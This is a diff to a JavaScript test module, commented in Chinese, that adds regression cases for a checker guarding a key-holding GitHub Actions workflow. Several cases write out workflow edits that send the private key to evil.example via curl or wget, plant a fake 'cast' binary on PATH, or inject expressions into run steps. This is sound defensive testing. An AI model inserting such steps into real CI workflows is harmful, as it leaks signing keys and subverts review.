@@ -3,6 +3,13 @@
 // 逐一確認都被擋下。審查當時有 27 個通過了檢查器（B01–B09b、C01、C01b、C05、C05b、C07、D06、
 // E01–E09），其中 E04、E06、E07、E09 審查判定不構成實際繞過，現在也一併擋下。
 //
+// 第二輪複審（N 系列）又找到 10 個通過檢查器的寫法：admin-call 守門之後的 step 加
+// `if: always()`／`failure()`（N01*）、run 經 `env.X`／`toJSON(github)` 內插（N02*、N16）、
+// 後續 step 的 `uses: docker://`、未釘 SHA 的 action、寫 `$GITHUB_PATH` 放假 `cast`（N04–N06）。
+// 現在由兩層擋：第一層整檔釘選擋掉對持鑰 workflow 的「任何」修改；第二層結構規則另外擋
+// N01*、N02*、N04、N05、N16。N06（改 PATH）是純 shell 內容，只有第一層擋得到（structural: null）。
+//
+// 每個案例有兩組預期：expect（完整檢查，含第一層）與 structural（只跑第二層，pins: null）。
 // 替換目標找不到（workflow 改版了）就丟錯：案例不能默默變成「什麼都沒改」。
 
 export const ADMIN = "admin-base-sepolia.yml";
@@ -34,15 +41,17 @@ function replaceOnce(text, from, to) {
 
 const rogue = (body) => ({ name: "rogue.yml", text: `name: rogue\non:\n  workflow_dispatch:\njobs:\n${body}` });
 const HASH = (job) => new RegExp(`admin-base-sepolia\\.yml#${job}：守門 step 的內容與檢查器釘住的不符`);
+/** 第一層（整檔釘選）的訊息。 */
+export const PIN = (file) => new RegExp(`^${file.replace(/\./g, "\\.")}：這是持有私鑰的 workflow，任何修改都要人工審過整份 diff`);
 const KEY = (job, key) => new RegExp(`admin-base-sepolia\\.yml#${job}：不可有這些鍵：[^（]*\`${key}\``);
 
 /**
  * @param {{ name: string, text: string }[]} real 現行 repo 的 workflow
- * @returns {{ id: string, desc: string, files: { name: string, text: string }[], expect: RegExp[] }[]}
+ * @returns {{ id: string, desc: string, files: { name: string, text: string }[], expect: RegExp[], structural: RegExp[] | null }[]}
  */
 export function bypassCases(real) {
   const cases = [];
-  const add = (id, desc, edits, extra, expect) => {
+  const add = (id, desc, edits, extra, expect, structural = expect) => {
     let files = real.map((f) => ({ ...f }));
     for (const [file, fn] of edits) {
       const f = files.find((x) => x.name === file);
@@ -52,7 +61,8 @@ export function bypassCases(real) {
       if (f.text === before) throw new Error(`${id}：對 ${file} 的修改沒有任何效果`);
     }
     files = files.concat(extra);
-    cases.push({ id, desc, files, expect: Array.isArray(expect) ? expect : [expect] });
+    const list = (x) => (x === null ? null : Array.isArray(x) ? x : [x]);
+    cases.push({ id, desc, files, expect: list(expect), structural: list(structural) });
   };
   const admin = (fn) => [[ADMIN, fn]];
 
@@ -172,6 +182,41 @@ export function bypassCases(real) {
   add("E09", "precheck 加 job 層級的 env（BASH_ENV）",
     admin((t) => inJob(t, "precheck", "    permissions: {}\n", "    permissions: {}\n    env:\n      BASH_ENV: /dev/null\n")), [],
     KEY("precheck", "env"));
+
+  // ── N：第二輪複審（整檔釘選＋結構規則 (g)）──
+  const SEND = "      - name: Send owner transaction\n";
+  const VAL = "      - name: Validate inputs\n";
+  const VAL_RUN = `${VAL}        run: |\n`;
+  const FOUNDRY = "      - name: Install Foundry\n";
+  const NOIF = /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 不可有 `if`/;
+  const RUNEXPR = /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 的 `run` 內插了/;
+  const USES = /admin-base-sepolia\.yml#admin-call：steps\[\d+\] 的 `uses: [^`]*` 不允許/;
+  const both = (structural) => [PIN(ADMIN), structural];
+  add("N01", "Send step 加 `if: always()`（守門失敗仍送交易；re-run failed jobs 重播已核准的呼叫）",
+    admin((t) => replaceOnce(t, SEND, `${SEND}        if: always()\n`)), [], both(NOIF), NOIF);
+  add("N01b", "Send step 加 `if: ${{ failure() || success() }}`",
+    admin((t) => replaceOnce(t, SEND, `${SEND}        if: \${{ failure() || success() }}\n`)), [], both(NOIF), NOIF);
+  add("N01c", "新增一個 `if: failure()` step 外送私鑰（守門失敗才跑）",
+    admin((t) => replaceOnce(t, FOUNDRY, `      - name: on-fail\n        if: failure()\n        env:\n          PK: \${{ secrets.KEEPER_PRIVATE_KEY }}\n        run: curl -d "$PK" https://evil.example\n${FOUNDRY}`)), [],
+    both(NOIF), NOIF);
+  add("N02", "Validate 的 run 內插 `${{ env.ARGS }}`（經 env 間接的 shell injection）",
+    admin((t) => replaceOnce(t, VAL_RUN, `${VAL_RUN}          echo \${{ env.ARGS }}\n`)), [], both(RUNEXPR), RUNEXPR);
+  add("N02b", "run 內插 `${{ fromJSON(toJSON(github)).event.inputs.args }}`",
+    admin((t) => replaceOnce(t, VAL_RUN, `${VAL_RUN}          echo \${{ fromJSON(toJSON(github)).event.inputs.args }}\n`)), [], both(RUNEXPR), RUNEXPR);
+  add("N02c", "run 內插 `${{ toJSON(github) }}`",
+    admin((t) => replaceOnce(t, VAL_RUN, `${VAL_RUN}          echo '\${{ toJSON(github) }}'\n`)), [], both(RUNEXPR), RUNEXPR);
+  add("N04", "Send 前插一步 `uses: docker://alpine:3` 並把私鑰給它",
+    admin((t) => replaceOnce(t, SEND, `      - uses: docker://alpine:3\n        env:\n          PK: \${{ secrets.KEEPER_PRIVATE_KEY }}\n        with:\n          args: sh -c "wget -qO- --post-data=$PK https://evil.example"\n${SEND}`)), [],
+    both(USES), USES);
+  add("N05", "Install Foundry 改成未釘 SHA 的 tag `@v1`",
+    admin((t) => replaceOnce(t, /foundry-toolchain@[0-9a-f]{40}/, "foundry-toolchain@v1")), [], both(USES), USES);
+  add("N06", "Install Foundry 之後加一步寫 `$GITHUB_PATH` 放假的 cast（只有整檔釘選擋得到）",
+    admin((t) => replaceOnce(t, VAL, `      - name: fake\n        run: |\n          mkdir -p /tmp/f\n          printf '%s\\n' '#!/bin/sh' 'curl -d "$*" https://evil.example' > /tmp/f/cast\n          chmod +x /tmp/f/cast\n          echo /tmp/f >> "$GITHUB_PATH"\n${VAL}`)), [],
+    PIN(ADMIN), null);
+  const N16 = /price-keeper\.yml#update-prices：steps\[\d+\] 的 `run` 內插了/;
+  add("N16", "price-keeper 的 run 內插 `${{ env.X }}`，X 來自 github.event.inputs（沒有宣告 inputs）",
+    [["price-keeper.yml", (t) => replaceOnce(t, /(\n    steps:\n)/, "$1      - env:\n          X: ${{ github.event.inputs.x }}\n        run: echo ${{ env.X }}\n")]], [],
+    [PIN("price-keeper.yml"), N16], N16);
 
   return cases;
 }
